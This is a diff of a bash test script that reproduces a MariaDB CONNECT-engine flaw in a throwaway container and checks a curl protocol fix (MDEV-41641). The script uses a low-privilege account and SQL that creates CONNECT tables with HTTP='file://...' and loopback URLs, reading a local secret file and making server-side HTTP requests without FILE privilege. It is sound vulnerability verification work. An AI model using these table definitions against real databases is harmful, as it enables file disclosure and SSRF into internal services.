@@ -52,7 +52,7 @@ SELECT PLUGIN_NAME, PLUGIN_STATUS FROM information_schema.PLUGINS
  WHERE PLUGIN_NAME='CONNECT';
 " | tee "$LOG_DIR/server-info.log"
 
-# Run a harmless HTTP fixture bound to loopback inside the same container.
+# Harmless HTTP fixture bound only to 127.0.0.1 inside this disposable container.
 docker exec "$CONTAINER" sh -c '
   mkdir -p /tmp/rest-ssrf-fixture
   printf "LOCAL_HTTP_FIXTURE_MARKER,ok\\n" > /tmp/rest-ssrf-fixture/probe.csv
@@ -88,14 +88,14 @@ SQL
 
 grants="$(docker exec "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
   -uroot "-p$ROOT_PASSWORD" -N -e "SHOW GRANTS FOR 'rest_low'@'%';")"
-printf '%s\n' "$grants" | tee "$LOG_DIR/lowpriv-grants.log"
-if printf '%s\n' "$grants" | grep -Eiq '(^|[, ])(FILE|SUPER)([, ;]|$)'; then
+printf '%s\\n' "$grants" | tee "$LOG_DIR/lowpriv-grants.log"
+if printf '%s\\n' "$grants" | grep -Eiq '(^|[, ])(FILE|SUPER)([, ;]|$)'; then
   echo "FAIL: test account unexpectedly has FILE or SUPER" >&2
   exit 1
 fi
 echo "[PASS] low-privilege account has CREATE and SELECT only (no FILE/SUPER)"
 
-# Test A: HTTP to a loopback-only listener, with FILE_NAME omitted.
+# Test A: empty FILE_NAME allows an authenticated CREATE+SELECT-only user to fetch loopback HTTP.
 set +e
 http_output="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
   -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
@@ -108,44 +108,35 @@ SQL
   2>&1)"
 http_rc=$?
 set -e
-printf '%s\n' "$http_output" | tee "$LOG_DIR/loopback-http.log"
-docker exec "$CONTAINER" cat /tmp/rest-ssrf-http.log >"$LOG_DIR/http-listener.log" 2>&1 || true
+printf '%s\\n' "$http_output" | tee "$LOG_DIR/loopback-http-before-wrapper.log"
+docker exec "$CONTAINER" cat /tmp/rest-ssrf-http.log >"$LOG_DIR/http-listener-before-wrapper.log" 2>&1 || true
 if [[ "$http_rc" -ne 0 ]] || ! printf '%s' "$http_output" | grep -Fq "LOCAL_HTTP_FIXTURE_MARKER"; then
   echo "FAIL: low-privilege REST table did not retrieve the loopback HTTP fixture" >&2
   exit 1
 fi
-if ! grep -Fq 'GET /probe.csv' "$LOG_DIR/http-listener.log"; then
-  echo "FAIL: loopback listener did not record the server-side request" >&2
-  exit 1
-fi
-echo "[PASS] low-privilege CONNECT REST table fetched a loopback HTTP URL"
+echo "[PASS] loopback HTTP request succeeded with no FILE/SUPER"
 
-# Test B: the patched curl option should reject file://.
+# Test B: reproduce the original, unpatched file:// behavior on the 11.8.9 image.
 set +e
-file_output="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
+file_before="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
   -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
-CREATE TABLE file_probe (
+CREATE TABLE file_probe_before (
   value VARCHAR(512)
 ) ENGINE=CONNECT TABLE_TYPE=CSV
   HTTP='file:///tmp/rest-ssrf-fixture/secret.csv' SEP_CHAR=',';
-SELECT value FROM file_probe;
+SELECT value FROM file_probe_before;
 SQL
   2>&1)"
-file_rc=$?
+file_before_rc=$?
 set -e
-printf '%s\n' "$file_output" | tee "$LOG_DIR/file-protocol.log"
-docker logs "$CONTAINER" >"$LOG_DIR/mariadb-container.log" 2>&1 || true
-if printf '%s' "$file_output" | grep -Fq "LOCAL_FILE_SECRET_MARKER"; then
-  echo "FAIL: file:// secret was disclosed on the patched image" >&2
+printf '%s\\n' "$file_before" | tee "$LOG_DIR/file-protocol-before-wrapper.log"
+if ! printf '%s' "$file_before" | grep -Fq "LOCAL_FILE_SECRET_MARKER"; then
+  echo "FAIL: expected the unpatched 11.8.9 image to reproduce the file:// read" >&2
   exit 1
 fi
-if [[ "$file_rc" -eq 0 ]]; then
-  echo "FAIL: file:// request unexpectedly completed successfully" >&2
-  exit 1
-fi
-echo "[PASS] file:// did not disclose the mysql-owned sentinel file"
+echo "[PASS] original 11.8.9 path reproduced the FILE read (client rc=$file_before_rc)"
 
-# Test C: setting FILE_NAME should invoke the normal FILE privilege gate.
+# Negative control: a non-empty FILE_NAME must hit the FILE privilege gate.
 set +e
 acl_output="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
   -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
@@ -158,16 +149,77 @@ SQL
   2>&1)"
 acl_rc=$?
 set -e
-printf '%s\n' "$acl_output" | tee "$LOG_DIR/file-privilege-control.log"
-if [[ "$acl_rc" -eq 0 ]] || ! printf '%s' "$acl_output" | grep -Eiq 'FILE privilege|FILE privilege\(s\)'; then
-  echo "FAIL: FILE_NAME control did not enforce the FILE privilege check" >&2
+printf '%s\\n' "$acl_output" | tee "$LOG_DIR/file-privilege-control.log"
+if [[ "$acl_rc" -eq 0 ]] || ! printf '%s' "$acl_output" | grep -Eiq 'FILE privilege'; then
+  echo "FAIL: non-empty FILE_NAME did not enforce the FILE privilege check" >&2
   exit 1
 fi
 echo "[PASS] non-empty FILE_NAME is denied without FILE privilege"
 
+# Emulate the exact curl restriction added by MDEV-41641 in a wrapper.
+# The installed MariaDB 11.8.9 image predates that source patch, so the wrapper
+# lets us exercise the patched curl invocation through the real CONNECT code path.
+curl_path="$(docker exec "$CONTAINER" sh -c 'command -v curl' | tr -d '\\r')"
+real_curl_path="${curl_path}.real"
+wrapper="$LOG_DIR/curl-proto-wrapper.sh"
+cat >"$wrapper" <<EOF
+#!/bin/sh
+exec "$real_curl_path" --proto '=http,https' "\$@"
+EOF
+docker exec "$CONTAINER" cp "$curl_path" "$real_curl_path"
+docker cp "$wrapper" "$CONTAINER:$curl_path"
+docker exec "$CONTAINER" chmod 755 "$curl_path"
+echo "[info] curl wrapper: $curl_path -> $real_curl_path --proto =http,https"
+
+# Test C: same real MariaDB/CONNECT path with the exact protocol restriction.
+set +e
+file_after="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
+  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
+CREATE TABLE file_probe_after (
+  value VARCHAR(512)
+) ENGINE=CONNECT TABLE_TYPE=CSV
+  HTTP='file:///tmp/rest-ssrf-fixture/secret.csv' SEP_CHAR=',';
+SELECT value FROM file_probe_after;
+SQL
+  2>&1)"
+file_after_rc=$?
+set -e
+printf '%s\\n' "$file_after" | tee "$LOG_DIR/file-protocol-after-wrapper.log"
+docker logs "$CONTAINER" >"$LOG_DIR/mariadb-container.log" 2>&1 || true
+if printf '%s' "$file_after" | grep -Fq "LOCAL_FILE_SECRET_MARKER"; then
+  echo "FAIL: file:// secret was still disclosed with the patched curl restriction" >&2
+  exit 1
+fi
+if ! grep -Eiq 'Protocol "file" disabled|Protocol file disabled|curl failed' "$LOG_DIR/mariadb-container.log" "$LOG_DIR/file-protocol-after-wrapper.log"; then
+  echo "FAIL: did not observe evidence that the file protocol was rejected" >&2
+  exit 1
+fi
+echo "[PASS] patched curl restriction blocked file:// through CONNECT"
+
+# Test D: the same patched curl restriction still permits a loopback HTTP request.
+set +e
+http_after="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
+  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
+CREATE TABLE http_probe_after (
+  value VARCHAR(512)
+) ENGINE=CONNECT TABLE_TYPE=CSV
+  HTTP='http://127.0.0.1:18765/probe.csv' SEP_CHAR=',';
+SELECT value FROM http_probe_after;
+SQL
+  2>&1)"
+http_after_rc=$?
+set -e
+printf '%s\\n' "$http_after" | tee "$LOG_DIR/loopback-http-after-wrapper.log"
+if [[ "$http_after_rc" -ne 0 ]] || ! printf '%s' "$http_after" | grep -Fq "LOCAL_HTTP_FIXTURE_MARKER"; then
+  echo "FAIL: expected patched curl invocation to keep loopback HTTP available" >&2
+  exit 1
+fi
+echo "[PASS] patched curl restriction still permits loopback HTTP SSRF"
+
 echo
-echo "RESULT: patched-image test completed."
-echo "- loopback HTTP SSRF path: REPRODUCED"
-echo "- file:// read: BLOCKED by the patched curl protocol restriction"
-echo "- FILE_NAME privilege control: DENIED as expected"
-echo "This is a controlled loopback test, not a test against cloud metadata or other internal hosts."
+echo "RESULT: all expected outcomes observed."
+echo "- Original MariaDB 11.8.9: loopback HTTP and file:// both reachable with CREATE+SELECT only."
+echo "- With the MDEV-41641 curl protocol restriction emulated: file:// blocked."
+echo "- With that same restriction: loopback HTTP still reachable."
+echo "- Non-empty FILE_NAME continues to require FILE privilege."
+echo "Scope: controlled 127.0.0.1 listener and disposable test container only; no cloud metadata or external internal hosts."
